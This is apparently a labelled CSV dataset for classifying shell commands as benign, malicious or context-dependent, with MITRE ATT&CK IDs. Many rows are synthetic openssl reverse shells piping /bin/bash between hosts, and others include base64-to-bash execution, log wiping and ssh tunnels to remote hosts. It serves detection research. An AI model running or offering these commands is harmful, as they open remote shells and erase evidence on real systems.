command,label,original_label,mitre_id
jj config [p|path] --workspace,Benign,Benign,Benign
pnmtopclxl [-du|-duplex] vertical|horizontal [-fo|-format] letter|legal|a3|a4|a5|... path/to/input1.pnm path/to/input2.pnm ... > path/to/output.pclxl,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.25:995 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
sc start VBoxDRV,Malicious,Malicious,T1564
echo $fish_encoded | base64 -d | bash,Malicious,Malicious,T1140
ssh -R 4444:localhost:53 user@192.168.1.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 10.10.10.10:993 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8081,Malicious,Synthetic,Synthetic
netstat -ano,Context_Dependent,Malicious,T1049
alias mkcd='_(){ mkdir -pv $1; cd $1; }; _',Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
conda install --upgrade package,Benign,Benign,Benign
"{{echo '{""key1"":""value1"", ""key2"":""value2""}'}} | mlr --ijson --ojson --jvstack cat",Benign,Benign,Benign
git log [-p|--patch] path/to/file_or_directory,Benign,Benign,Benign
openssl s_client -quiet -connect 10.10.10.50:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
ssh -L 8080:localhost:9001 jenkins@10.10.10.50,Context_Dependent,Synthetic,Synthetic
pw-cli [i|info] all,Benign,Benign,Benign
"xsv select column1,column2 path/to/file.csv",Benign,Benign,Benign
"units ""meters / second"" ""inches / hour""",Benign,Benign,Benign
"echo 'hello, world' | cat",Benign,Benign,Benign
find . -print | grep -i foo,Benign,Benign,Benign
pulumi env rm environment_name,Benign,Benign,Benign
find . -name aaa -print,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.5.20:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
"if condition_command; then echo ""Condition is true""; else echo ""Condition is false""; fi",Benign,Benign,Benign
ssh -R 8080:localhost:9090 deploy@10.20.30.40,Context_Dependent,Synthetic,Synthetic
waitress-serve --unix-socket=path/to/socket import.path:wsgi_func,Benign,Benign,Benign
composer require user/package,Benign,Benign,Benign
sudo pacman -Syu --overwrite path/to/file,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.10:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
lsusb [-t|--tree],Benign,Benign,Benign
"bind -m vi-insert '""{"" ""\C-v{}\ei""'",Benign,Benign,Benign
ifstat [-e|--errors],Benign,Benign,Benign
set -ex,Benign,Benign,Benign
find /usr/tom | egrep '*.pl| *.pm',Benign,Benign,Benign
pamflip [-r|-rotate]90|180|270 path/to/input.pam > path/to/output.pam,Benign,Benign,Benign
"autossh -f -M monitor_port -N ""ssh_command""",Benign,Benign,Benign
sudo log -f /var/log/system.log | : > /var/log/system.log,Malicious,Malicious,T1070
i2cget i2cbus device_address register_address b|w|c|s|i,Benign,Benign,Benign
xvfb-run [-a|--auto-servernum] command,Benign,Benign,Benign
openssl s_client -quiet -connect 172.16.0.25:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 172.16.0.10:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 10.20.30.40:8888 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
treetime mugration,Benign,Benign,Benign
in-toto-sign [-f|--file] unsigned.layout [-k|--keep] priv_key1 priv_key2 [-o|--output] root.layout,Benign,Benign,Benign
terminalizer share path/to/recording.gif,Benign,Benign,Benign
ssh -L 8080:localhost:80 user@192.168.1.254,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:6379,Malicious,Synthetic,Synthetic
mid3v2 --list-frames path/to/file1.mp3 path/to/file2.mp3 ...,Benign,Benign,Benign
e4defrag -v /dev/sdXN,Benign,Benign,Benign
ykinfo -s -q,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3306,Malicious,Synthetic,Synthetic
sdelete -p 3 path\to\file1 path\to\file2 ...,Benign,Benign,Benign
unix2mac [-i|--info] path/to/file,Benign,Benign,Benign
xsel [-ob|--output --clipboard],Benign,Benign,Benign
sui client faucet,Benign,Benign,Benign
ssh -R 8080:localhost:5432 root@corp-backup.internal,Context_Dependent,Synthetic,Synthetic
ssh -R 4444:localhost:1433 user@192.168.1.25,Context_Dependent,Synthetic,Synthetic
"CommandLineTemplate=""$($Env:SystemRoot)\System32\notepad.exe"";}",Malicious,Malicious,T1546
git bundle create path/to/file.bundle branch_name,Benign,Benign,Benign
screen -x screen id,Benign,Benign,Benign
gopass sync,Benign,Benign,Benign
"foreach ($f in $dirsFilter) { if ($root -like ""*$f*"") { $match = $true; break } }",Context_Dependent,Malicious,T1083
openssl s_client -quiet -connect 10.20.30.40:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
xml [val|validate] --help,Benign,Benign,Benign
sudo $program_path -a -t 3,Context_Dependent,Malicious,T1040
openssl s_client -quiet -connect 172.20.10.8:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
gnucash --nofile,Benign,Benign,Benign
watchman watch-del-all,Benign,Benign,Benign
ssh -R 8080:localhost:80 admin@malware.site,Context_Dependent,Synthetic,Synthetic
lpadmin -d printer,Benign,Benign,Benign
swaks [-t|--to] user@example.com [-s|--server] test-server.example.net,Benign,Benign,Benign
"systemd-notify --status ""Add custom status message here...""",Benign,Benign,Benign
return $files,Context_Dependent,Malicious,T1005
openssl s_client -quiet -connect 172.20.10.8:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.0.5:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
ansible-vault view --vault-password-file path/to/password_file path/to/vault_file,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.0.50:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
